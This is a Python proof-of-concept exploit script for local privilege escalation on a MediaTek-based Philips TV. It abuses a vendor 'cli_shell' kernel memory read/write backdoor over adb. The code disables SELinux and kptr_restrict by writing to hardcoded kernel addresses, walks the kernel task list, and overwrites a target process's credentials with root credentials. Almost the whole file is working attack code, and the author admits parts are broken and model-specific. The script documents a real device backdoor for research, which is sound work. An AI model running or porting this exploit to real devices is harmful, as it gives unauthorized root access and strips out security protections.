#!/usr/bin/env python3

"""

LPE exploit PoC using a ring0 mem r/w vendor/supplier backdoor (MediaTek)
Some things like "walk_sibling_task" are horribly broken.

This code won't run fully automated unless you make it so:
You'll need to modify some constants like "MATCHED_PID" for now.
Take the shell "echo $$" or adbd's pid from "ps". If you do the latter you'll have to open a new instance of "adb shell" in order to make it work.

Requires:
 adb connection
  using a usb a/a cable
  ethernet (maybe wifi) connection. make double sure that it won't have access to any other device or the internet.
   That TV is trying to spy like hell. Put it in it's own fully locked down VLAN or kill it with fire, your choice.
 or local shell:
  some modifications will be needed

Works on: TPM171E 55PUS7363/12 autorun-TPM171E_R.107.001.136.003.upg. Modifications (e.g. of kernel addresses) will be needed for other models and/or firmware versions.

Use it AT YOUR OWN RISK. The code won't get fixed because the TV will be discarded.

"""



import subprocess, os, time, struct
from threading import Thread

ADDRS = {}
PGD = 0xc0004000
SHOWED_TASK_BASES = []
TASK_CHILDREN_NEXT = 0x268
TASK_SIBLING_NEXT = 0x270
SELINUX_CONTEXT_INIT = 0x1
SELINUX_CONTEXT_SHELL = 0xa

def decode_addr_line(line):
    global ADDRS
    line = line.split('] ', 1)[1]
    addr, vals = line.split(' | ', 1)
    addr = int(addr, 0)
    vals = [int(i, 16) for i in vals.split(' ')]
    for i in range(len(vals)):
        ADDRS[addr+(i*4)] = vals[i]
    #print(ADDRS)
    #print(hex(addr), ':', [hex(i) for i in vals])

def read_logcat():
    os.system(f'adb logcat -c &> /dev/null')
    proc = subprocess.Popen(['adb','logcat'],stdout=subprocess.PIPE)
    for line in proc.stdout:
        line = line.rstrip()
        if (not line.isascii()):
            continue
        line = line.decode()
        if ('MTK_KL' in line and '0x' in line and ' | ' in line):
            #print(line)
            line = line.rstrip('_')
            decode_addr_line(line)

def mrd(addr, length=4):
    if (addr in ADDRS):
        return ADDRS[addr]
    #os.system(f'adb logcat -c &> /dev/null')
    cmd = f'cli_shell "r {addr} {length}"'
    os.system(f'adb shell \'{cmd}\' &> /dev/null')
    while True:
        try:
            val = ADDRS[addr]
            break
        except KeyError:
            time.sleep(0.1)
    return val

def mwd(addr, val):
    cmd = f'cli_shell "w {addr} {val}"'
    os.system(f'adb shell \'{cmd}\' &> /dev/null')

#read_logcat()
Thread(target=read_logcat).start()

def read_pages():
    pmd = mrd(PGD)
    print('pmd:', hex(pmd))

def disable_selinux():
    selinux_enabled_addr = 0xc08d35b0
    selinux_disabled_addr = 0xc0966d98
    selinux_enforcing_addr = 0xc0966d8c
    mwd(selinux_enabled_addr, 0)
    mwd(selinux_disabled_addr, 1)
    mwd(selinux_enforcing_addr, 0)

def unmask_kallsyms():
    kptr_restrict_addr = 0xc08b8708
    mwd(kptr_restrict_addr, 0)

def read_task_name(task_base):
    taskname_addr = task_base+0x340
    #print('taskname_addr:', hex(taskname_addr))
    taskname = b''
    taskname += struct.pack('<L', mrd(taskname_addr, 16))
    taskname += struct.pack('<L', mrd(taskname_addr+0x4, 4))
    taskname += struct.pack('<L', mrd(taskname_addr+0x8, 4))
    taskname += struct.pack('<L', mrd(taskname_addr+0xc, 4))
    #taskname = taskname.rstrip(b'\x00').decode()
    taskname_index = taskname.index(b'\x00')
    taskname = taskname[:taskname_index] #.decode()
    return taskname

def read_task_uidgid(task_base):
    global KERNEL_TEST_CRED, KERNEL_TEST_REAL_CRED
    cred = 0x33c
    real_cred = 0x338
    taskcred_addr = task_base+0x33c
    taskcred = mrd(taskcred_addr)
    #uid, gid = 1337, 1337
    if (taskcred):
        taskpid = mrd(task_base+0x258)
        if (taskpid == 0):
            KERNEL_TEST_CRED = mrd(task_base+cred)
            KERNEL_TEST_REAL_CRED = mrd(task_base+real_cred)
        uid, gid = mrd(taskcred+0x4), mrd(taskcred+0x8)
        taskcred_security = mrd(taskcred+0x5c)
        print(f'taskcred_security=={taskcred_security:#x}')
        if (taskcred_security):
            taskcred_security_sid = mrd(taskcred_security+0x4)
            print(f'taskcred_security_sid=={taskcred_security_sid:#x}')
    else:
        uid = gid = 'NULLpointer'
    return uid, gid

def write_task_uidgid(task_base, uid, gid, taskcred_security_sid):
    #return
    cred = 0x33c
    real_cred = 0x338
    for offset in [cred, real_cred]:
        taskcred_addr = task_base+offset
        taskcred = mrd(taskcred_addr)
        if (not taskcred):
            return
        taskpid = mrd(task_base+0x258)
        if (taskpid == MATCHED_PID):
        #if (taskname == 'adbd'):
            mwd(task_base+cred, KERNEL_TEST_CRED)
            mwd(task_base+real_cred, KERNEL_TEST_REAL_CRED)
            return
        for i in range(0x4, 0x24, 8):
            mwd(taskcred+i, 0)
            mwd(taskcred+i+4, 0)
        taskcred_security = mrd(taskcred+0x5c)
        if (taskcred_security):
            mwd(taskcred_security+0x4, taskcred_security_sid)

def read_task(task_base):
    global SHOWED_TASK_BASES
    SHOWED_TASK_BASES.append(task_base)
    #for i in range(task_base, task_base+0x540, 0x70):
    #    mrd(i, 0x70)
    PRIOS_CHECK = ()
    #PRIOS_CHECK = ([100]*3, [110]*3, [114]*3, [118]*3, [120]*3, [130]*3, [97, 120, 97], [98, 120, 98], [98, 112, 98], [0, 120, 0], [62, 120, 62], [15, 120, 15], [22, 120, 22], [25, 120, 25], [31, 120, 31], [50, 120, 50])
    if (PRIOS_CHECK):
        #print('task_base_addr:', hex(task_base))
        prios = [mrd(task_base+0x20), mrd(task_base+0x24), mrd(task_base+0x28)]
        print(f'task_base: {task_base:#x} prios: {prios}')
        if (prios not in PRIOS_CHECK):
            print('PRIOS ARE WRONG, EXITING!!!')
            #exit()
    #try:
    #print('read_task_0')
    taskname = 'N/A'
    #taskname = read_task_name(task_base)
    #print('read_task_1')
    taskpid = mrd(task_base+0x258)
    #print('read_task_2')
    #except UnicodeDecodeError:
    #    taskname = 'Exception: UnicodeDecodeError'
    uid = gid = 'N/A'
    if (taskpid == 0):
        uid, gid = read_task_uidgid(task_base)
    #print('read_task_3')
    print(f'task_base: {task_base:#x} taskpid: {taskpid} uid/gid: {uid}/{gid} taskname: {taskname}')
    if (taskpid == MATCHED_PID):
    #if (taskname == 'adbd'):
        write_task_uidgid(task_base, 0, 0, 0xa)
        exit()
    ###

def brute_task(task_base):
    VALID_BASE = (0xc0000000, 0xd0000000)
    addrs = []
    print('task_base_addr:', hex(task_base))
    for addr in range(task_base+0x800, task_base+0x1000, 0x4):
        mrd(addr, 32) # prefetch
        #print('before mrd')
        val = mrd(addr) # get value
        #print('after mrd')
        if ((val & 0xf0000000) in VALID_BASE):
            print(f'addrs.append({val:#x})')
            addrs.append(val)
    for addr in addrs:
        val = mrd(addr) # list_item_next
        if ((val & 0xf0000000) in VALID_BASE):
            try:
                taskname = read_task_name(val)
            except UnicodeDecodeError:
                taskname = 'Exception: UnicodeDecodeError'
            print('taskname:', repr(taskname))
    print('brute_task_end')

def read_sibling_task(task_sibling):
    while True:
        #read_task(task_sibling-TASK_CHILDREN_NEXT-8)
        #task_sibling_old = task_sibling
        print('TEST_0')
        #read_task(task_sibling-TASK_SIBLING_NEXT)
        print(f'0_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'1_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'2_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'3_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'4_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'5_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'6_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'7_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'8_task_sibling={task_sibling:#x}')
        task_sibling = mrd(task_sibling)
        print(f'9_task_sibling={task_sibling:#x}')
        print('TEST_1')
        read_task(task_sibling-TASK_SIBLING_NEXT)
        task_sibling = mrd(task_sibling)
        task_sibling = mrd(task_sibling)
        print('TEST_2')
        read_task(task_sibling-TASK_CHILDREN_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_3')
        read_task(task_sibling-TASK_SIBLING_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_4')
        read_task(task_sibling-TASK_SIBLING_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_5')
        read_task(task_sibling-TASK_CHILDREN_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_6')
        read_task(task_sibling-TASK_SIBLING_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_7')
        read_task(task_sibling-TASK_SIBLING_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_8')
        read_task(task_sibling-TASK_CHILDREN_NEXT)
        task_sibling = mrd(task_sibling)
        print('TEST_9')
        read_task(task_sibling-TASK_CHILDREN_NEXT)
        task_sibling = mrd(task_sibling)
        #if (task_base in SHOWED_TASK_BASES or old_task_base == task_base):
        #    break

def walk_children_task(task_base, ignore_first=False):
    task_base_first = task_base
    task_children_first = task_children = task_base+TASK_CHILDREN_NEXT
    while True:
        if (not (ignore_first and task_base == task_base_first)):
            read_task(task_base)
        task_children_prev = task_children
        print(f'task_children_0=={task_children_prev:#x}')
        task_children = mrd(task_children)
        print(f'task_children_1=={task_children:#x}')
        if (task_children == task_children_first or task_children == task_children_prev):
        #if (not task_children or task_children == task_children_first or task_children == task_children_prev):
            break
        task_base = task_children-TASK_SIBLING_NEXT
        walk_children_task(task_base, True)
        
def walk_sibling_task(task_base):
    task_sibling_first = task_sibling = task_base+TASK_SIBLING_NEXT
    print(f'task_sibling_first={task_sibling_first:#x}')
    i=0
    while True:
        read_task(task_base)
        task_sibling = mrd(task_sibling)
        print(f'{i}_task_sibling={task_sibling:#x}')
        if (task_sibling == task_sibling_first):
            break
        task_base = task_sibling-TASK_SIBLING_NEXT
        #if (task_base & 8):
        #    task_base += 8
        ##walk_children_task(task_base)
        i+=1
        

def list_tasks(task_base):
    read_task(task_base)
    #task_base = mrd(task_base+TASK_CHILDREN_NEXT)-TASK_SIBLING_NEXT
    #read_task(task_base)
    #task_base = mrd(task_base+TASK_CHILDREN_NEXT)-TASK_SIBLING_NEXT
    ##read_task(task_base)
    #
    #task_base = mrd(task_base+TASK_CHILDREN_NEXT)-TASK_CHILDREN_NEXT
    #read_task(task_base)
    #
    #task_base = mrd(task_base+TASK_SIBLING_NEXT)-TASK_SIBLING_NEXT
    #task_base = mrd(task_base+TASK_CHILDREN_NEXT)
    #task_base = mrd(task_base+TASK_CHILDREN_NEXT)-TASK_SIBLING_NEXT
    #task_base = mrd(task_base+TASK_SIBLING_NEXT)-TASK_CHILDREN_NEXT
    #task_base = mrd(task_base+TASK_SIBLING_NEXT)-TASK_CHILDREN_NEXT
    task_children = task_base+TASK_CHILDREN_NEXT
    print(f'0_task_children={task_children:#x}')
    task_children = mrd(task_children)
    print(f'1_task_children={task_children:#x}')
    task_children = mrd(task_children)
    print(f'2_task_children={task_children:#x}')
    task_children = mrd(task_children)
    print(f'3_task_children={task_children:#x}')
    task_children = mrd(task_children)
    print(f'4_task_children={task_children:#x}')
    task_children = mrd(task_children)
    print(f'5_task_children={task_children:#x}')
    task_children = mrd(task_children)
    print(f'6_task_children={task_children:#x}')
    #print(hex(task_base))
    #read_task(task_base)
    #
    #read_sibling_task(task_base)
    #exit()
    #print('task_base_addr:', hex(task_base))
    #taskname = read_task_name(task_base)
    #print('taskname:', repr(taskname))

###mwd(0xd46b8900+0x4, 0xa)
unmask_kallsyms()
disable_selinux()
#MATCHED_PID = 'invalid'
#MATCHED_PID = 3830
#MATCHED_PID = 3921 # shell
MATCHED_PID = 1340 # adbd
#read_pages()
#read_task(0xc08bf670) # init_task
#brute_task(0xc08bf670) # init_task
#list_tasks(0xc08bf670) # init_task
walk_children_task(0xc08bf670) # init_task
#walk_sibling_task(0xd6048000) # /bin/init
#read_task(0xd59bd940) # surfaceflinger pid 1296
#read_task(0xC09374E0)
#read_task(0xd6048000) # init pid 1
##read_task(0xcd52bf00) # sh pid 3830
exit()

#addr = 0xd2f29d88
#addr = 0xc0000084
#addr = 0xd59f8fc0
#addr = 0xc0008000
#addr = 0x00008000
#addr = 0xc011052c

# autorun-TPM171E_R.107.001.136.003.upg selinux_enabled PTR *0xc022cd38==0xc08d35b0
addr = 0xc08d35b0
# autorun-TPM171E_R.107.001.136.003.upg selinux_disabled 0xc0966d98
addr = 0xc0966d98
# autorun-TPM171E_R.107.001.136.003.upg selinux_enforcing 0xc0966d8c
addr = 0xc0966d8c
# autorun-TPM171E_R.107.001.136.003.upg init_task PTR *0xc0839918==0xc08bf670
#addr = 0xc08bf670
# pid
#addr = 0xc08bf760
addr = 0xc08bf6f0
## autorun-TPM171E_R.107.001.136.003.upg kptr_restrict 0xc08b8708
#addr = 0xc08b8708

val = mrd(addr)
print(hex(val))
val_orig = val

#mwd(addr, 0x0)
#mwd(addr, 0x1)
#mwd(addr, 0x2)

exit()

mwd(addr, 0xdeadbeef)
val = mrd(addr)
print(hex(val))

mwd(addr, val_orig)
val = mrd(addr)
print(hex(val))









